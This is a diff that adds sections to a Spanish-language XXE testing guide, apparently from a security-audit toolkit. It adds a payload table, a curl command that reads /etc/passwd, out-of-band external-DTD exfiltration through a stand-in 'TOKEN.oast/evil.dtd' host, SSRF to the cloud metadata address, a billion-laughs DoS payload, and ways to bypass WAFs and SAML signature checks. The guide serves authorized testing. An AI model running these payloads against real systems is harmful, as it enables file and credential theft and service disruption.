@@ -165,6 +165,57 @@ chains_with: [ssrf, info-disclosure, lfi-rfi]
 - Interactsh/Burp Collaborator — blind/OOB confirmation listener.
 - Burp Suite — intercepting and modifying SAML/SOAP XML bodies in transit.
 
+## Payloads & Detection Patterns
+
+Guía de caza: una familia por técnica de resolución de entidad. Para vectores ciegos, el único
+camino a `Demonstrated` es un hit correlacionado por token en el gate OOB (external DTD).
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| Classic in-band | `<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` + `&xxe;` | Leer archivo reflejado en la respuesta |
+| OOB external DTD | `<!ENTITY % remote SYSTEM "http://TOKEN.oast/evil.dtd"> %remote;` | Exfil ciega de archivos vía parameter entities |
+| Error-based | DTD con `<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>` | Exfil dentro del mensaje de error del parser |
+| SSRF via entity | `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` | Entity como primitiva de red interna |
+| PHP wrapper | `php://filter/convert.base64-encode/resource=index.php` | Leer fuente sin romper el XML con binarios |
+| File-format wrapped | SVG/DOCX/XLSX con DOCTYPE inyectado en `document.xml` | Entregar XXE por upload |
+| Parameter entity | `<!ENTITY % ...>` anidado (`%eval; %exfil;`) | Único vector cuando entities generales están bloqueadas |
+| Billion laughs (DoS) | `<!ENTITY lol2 "&lol;&lol;...">` expansión exponencial | Solo con gate de operador (es DoS, no read) |
+
+Surface signals que delatan la clase antes de inyectar:
+- `Content-Type: application/xml`, `text/xml`, `application/soap+xml`.
+- Uploads XML-based: DOCX/XLSX/PPTX (zip), SVG, GPX, RSS/OPML, config import.
+- Flujos SAML SSO (la assertion es XML, parseada a menudo antes de validar firma).
+- Errores revelando el parser: `libxml`, `Xerces`, `SAXParseException`, `DOMDocument`.
+- Endpoint JSON que igual parsea XML si se cambia el `Content-Type` (auto-detect).
+
+```bash
+# confirmar parseo XML y lectura clásica en-banda
+curl -s -X POST https://target/api/import -H 'Content-Type: application/xml' \
+  --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r><n>&xxe;</n></r>' \
+  | grep -i 'root:x:0:0'
+```
+
+```bash
+# blind OOB vía external DTD con token (gate obligatorio)
+python3 -m engine.oast token --audit-dir . --purpose blind-xxe --vuln-class xxe \
+  --target-url https://target/api/import --parameter body   # hospedar evil.dtd en payload_url
+python3 -m engine.oast poll --audit-dir .                    # hit correlacionado = Demonstrated
+```
+
+## Bypass Techniques
+
+Agrupadas por la defensa que evaden; probar la familia completa antes de concluir no-vulnerable.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| Reflejo de entity general bloqueado | Parameter entities `%` (external DTD) | Muchos apps bloquean el reflejo directo pero resuelven DTD externo |
+| Egress de red filtrado | Error-based exfil (sin conexión saliente) | Datos surgen dentro del mensaje de error |
+| Binarios rompen el XML | PHP `php://filter` base64, CDATA wrapping | Evita caracteres no-XML del archivo leído |
+| WAF sobre el body XML | Encoding UTF-16/UTF-7 del documento, BOM, whitespace en DOCTYPE | El parser normaliza lo que el WAF no inspecciona |
+| Validación de firma SAML | Inyectar en porción no firmada / antes de verificar firma | Libs que parsean antes de validar |
+| Server re-serializa el upload | Inyectar en formato que no se normaliza (SVG servido directo vs DOCX re-saved) | Documentar como mitigante si lo re-guarda |
+| Entity blocklist local | Remote DTD hospedado en infra propia | Mueve la definición fuera del documento filtrado |
+
 ## Root Causes
 
 - XML parser configured with external entity resolution enabled (`DTDLoadExternal`,
